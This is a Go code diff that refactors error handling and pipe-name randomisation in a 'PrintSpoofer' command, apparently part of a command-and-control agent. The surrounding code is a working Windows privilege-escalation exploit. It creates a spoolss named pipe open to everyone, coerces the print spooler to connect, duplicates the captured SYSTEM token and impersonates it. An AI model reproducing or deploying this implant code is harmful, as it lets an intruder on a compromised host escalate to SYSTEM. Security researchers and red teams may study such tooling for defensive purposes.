@@ -4,6 +4,8 @@
 package commands
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"runtime"
@@ -48,22 +50,14 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Check SeImpersonatePrivilege first
 	if !checkPrivilege("SeImpersonatePrivilege") {
-		return structs.CommandResult{
-			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).")
 	}
 
 	// Get computer name for the printer path.
 	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
 	compNameSize := uint32(len(compNameBuf))
 	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("GetComputerName failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("GetComputerName failed: %v", err)
 	}
 	computerName := windows.UTF16ToString(compNameBuf[:compNameSize])
 
@@ -76,9 +70,9 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Generate a random pipe name suffix
-	var randBuf [8]byte
-	windows.GetSystemTimeAsFileTime((*windows.Filetime)(unsafe.Pointer(&randBuf)))
-	pipeSuffix := fmt.Sprintf("ps_%x", randBuf[4:8])
+	var randBuf [4]byte
+	_, _ = rand.Read(randBuf[:])
+	pipeSuffix := hex.EncodeToString(randBuf[:])
 
 	// Create the named pipe: \\.\pipe\{suffix}\pipe\spoolss
 	pipePath := fmt.Sprintf(`\\.\pipe\%s\pipe\spoolss`, pipeSuffix)
@@ -86,18 +80,10 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	// Create security descriptor allowing Everyone to connect
 	sd, sdErr := windows.NewSecurityDescriptor()
 	if sdErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("NewSecurityDescriptor failed: %v", sdErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("NewSecurityDescriptor failed: %v", sdErr)
 	}
 	if err := sd.SetDACL(nil, true, false); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("SetDACL failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("SetDACL failed: %v", err)
 	}
 
 	sa := windows.SecurityAttributes{
@@ -108,11 +94,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("UTF16 conversion failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("UTF16 conversion failed: %v", err)
 	}
 
 	// Build hostname list for triggers.
@@ -176,11 +158,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 			uintptr(unsafe.Pointer(&sa)),
 		)
 		if hPipe == uintptr(windows.InvalidHandle) {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CreateNamedPipe failed for %s (attempt %d): %v", pipePath, attempt, createErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CreateNamedPipe failed for %s (attempt %d): %v", pipePath, attempt, createErr)
 		}
 		pipeHandle := windows.Handle(hPipe)
 
@@ -188,11 +166,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		event, eventErr := windows.CreateEvent(nil, 1, 0, nil)
 		if eventErr != nil {
 			windows.CloseHandle(pipeHandle)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CreateEvent failed: %v", eventErr)
 		}
 
 		var overlapped windows.Overlapped
@@ -202,11 +176,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		if ret == 0 && connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
 			windows.CloseHandle(event)
 			windows.CloseHandle(pipeHandle)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("ConnectNamedPipe failed (attempt %d): %v", attempt, connectErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("ConnectNamedPipe failed (attempt %d): %v", attempt, connectErr)
 		}
 
 		connected := connectErr == windows.ERROR_PIPE_CONNECTED
@@ -274,11 +244,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 			procDisconnectNamedPipe.Call(hPipe)
 			windows.CloseHandle(event)
 			windows.CloseHandle(pipeHandle)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Spooler connected as %s but failed to capture token: %v", clientIdentity, err)
 		}
 
 		err = windows.DuplicateTokenEx(
@@ -307,11 +273,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 			procDisconnectNamedPipe.Call(hPipe)
 			windows.CloseHandle(event)
 			windows.CloseHandle(pipeHandle)
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Spooler connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err)
 		}
 
 		// Clean up pipe
@@ -324,11 +286,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		if setErr := SetIdentityToken(dupToken); setErr != nil {
 			runtime.UnlockOSThread()
 			windows.CloseHandle(windows.Handle(dupToken))
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Spooler connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr)
 		}
 
 		osThreadLocked = true
@@ -349,11 +307,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
 		sb.WriteString("Use 'whoami' to verify current context.\n")
 
-		return structs.CommandResult{
-			Output:    sb.String(),
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult(sb.String())
 	}
 
 	// Timeout — no SYSTEM connection received
@@ -370,11 +324,7 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 			sb.WriteString(fmt.Sprintf("  %s\n", w))
 		}
 	}
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "error",
-		Completed: true,
-	}
+	return errorResult(sb.String())
 }
 
 // triggerSpooler calls OpenPrinterW with a crafted path that causes the
